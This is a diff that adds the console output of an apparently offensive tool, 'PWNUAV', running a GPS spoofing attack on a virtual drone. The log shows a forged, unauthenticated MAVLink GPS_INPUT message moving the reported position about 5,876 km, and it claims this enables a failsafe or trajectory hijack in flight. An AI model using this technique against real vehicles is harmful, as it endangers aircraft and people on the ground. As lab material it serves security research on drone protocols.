@@ -1,0 +1,17 @@
+========== PWNUAV GPS SPOOFING (virtual) ==========
+[*] Baseline position (real): lat 37.774900  lon -122.419400
+[*] Spoof target            : lat 6.251800  lon -75.563600  alt 1500 m
+[*] Displacement to force   : ~5,876 km
+
+[NV-01] Injecting forged GPS_INPUT  (fix_type=3 3D, sats=12, hdop=1.0) ...
+        MAVLink GPS_INPUT: gps_id=0 ignore_flags=0 lat/lon=deg*1e7 alt=m
+
+[*] Reported GLOBAL_POSITION_INT after injection:
+   t+ 0.0s  lat   37.774900  lon  -122.419400   
+   t+ 0.0s  lat   37.774900  lon  -122.419400   
+   t+ 0.0s  lat   37.774900  lon  -122.419400   
+   t+ 0.1s  lat    6.251800  lon   -75.563600   <- ADOPTED
+
+[IM-03] EKF/home now believe the vehicle is ~5,876 km away.
+[IM-02] In flight this trips the GPS/geofence failsafe -> RTL / trajectory hijack.
+[+] POSITION HIJACKED with a single unauthenticated GPS_INPUT.
